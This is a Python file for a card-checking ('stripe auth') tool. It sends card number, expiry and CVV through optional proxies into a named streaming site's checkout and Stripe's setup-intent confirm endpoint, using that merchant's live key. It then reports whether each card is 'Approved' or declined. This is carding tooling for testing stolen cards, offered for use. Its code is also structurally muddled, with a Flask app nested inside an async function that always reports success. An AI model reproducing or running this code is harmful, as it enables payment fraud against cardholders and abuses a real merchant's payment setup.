
import asyncio

async def stripe_auth(data):
    try:
        cc = data.get("cc")
        if not cc:
            return {"error": "Missing cc"}
        cc, mes, ano, cvv = cc.split("|")

        # Begin original logic
        from flask import Flask, request, jsonify
        import requests
        import re
        
        app = Flask(__name__)
        
        def parse(text, a, b):
            return text.split(a)[1].split(b)[0]
        
        @app.route('/str', methods=['GET', 'POST'])
        def stripe():
            cc_input = request.values.get('cc')
            proxy_input = request.values.get('proxy')
        
            if not cc_input:
                return jsonify({'error': 'Missing cc parameter'}), 400
        
            try:
                cc, mes, ano, cvv = cc_input.split('|')
            except:
                return jsonify({'error': 'Invalid cc format, must be cc|mm|yy|cvv'}), 400
        
            # Session start
            session = requests.Session()
            if proxy_input:
                proxy_url = f"http://{proxy_input}"
                session.proxies.update({
                    'http': proxy_url,
                    'https': proxy_url
                })
        
            # STEP 1: Pre-checkout signup (original request)
            session.post(
                'https://www.tmilly.tv/checkout/submit_form_sign_up',
                params={'o': '32247'},
                headers={
                    'accept': 'text/vnd.turbo-stream.html, text/html, application/xhtml+xml',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'origin': 'https://www.tmilly.tv',
                    'referer': 'https://www.tmilly.tv/checkout/new?o=32247',
                    'user-agent': 'Mozilla/5.0',
                },
                data='authenticity_token=abc123&form%5Bemail%5D=test%40mail.com&form%5Bname%5D=Tester&form%5Bterms_and_conditions%5D=on'
            )
        
            # STEP 2: Get setup_intent
            r = session.get(
                'https://www.tmilly.tv/api/billings/setup_intent',
                params={'page': 'checkouts'},
                headers={
                    'accept': 'application/json',
                    'referer': 'https://www.tmilly.tv/checkout/new?o=32247',
                    'user-agent': 'Mozilla/5.0'
                }
            )
            try:
                data = r.json()
                setup_intent = data.get('setup_intent', '')
                seti2 = setup_intent.split('_secret_')[0] if setup_intent else ''
            except:
                return jsonify({'error': 'Failed to get setup_intent'}), 500
        
            # STEP 3: Confirm payment
            payload = f'return_url=https%3A%2F%2Fwww.tmilly.tv%2Fcheckout%2Fsuccess%3Fo%3D32247&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[billing_details][address][country]=IN&expected_payment_method_type=card&client_context[currency]=usd&client_context[mode]=subscription&client_context[setup_future_usage]=off_session&_stripe_account=acct_1FawFBC0yx1905mY&key=pk_live_DImPqz7QOOyx70XCA9DSifxb&client_secret={setup_intent}'
        
            confirm = session.post(
                f'https://api.stripe.com/v1/setup_intents/{seti2}/confirm',
                headers={
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'user-agent': 'Mozilla/5.0'
                },
                data=payload
            )
        
            if confirm.status_code == 200:
                return jsonify({'status': 'success', 'message': '✅ Approved'})
            else:
                try:
                    error_data = confirm.json()
                    error = error_data.get('error', {})
                    decline_code = error.get('decline_code', 'unknown')
                    message = error.get('message', 'Unknown error')
                    return jsonify({'status': 'failed', 'decline_code': decline_code, 'message': message})
                except:
                    return jsonify({'status': 'failed', 'message': 'Unknown error and no JSON response'})
        
        if __name__ == '__main__':
            app.run(debug=True)

        # End logic

        return {"status": "success", "message": "✅ Check Complete"}
    except Exception as e:
        return {"status": "error", "message": str(e)}
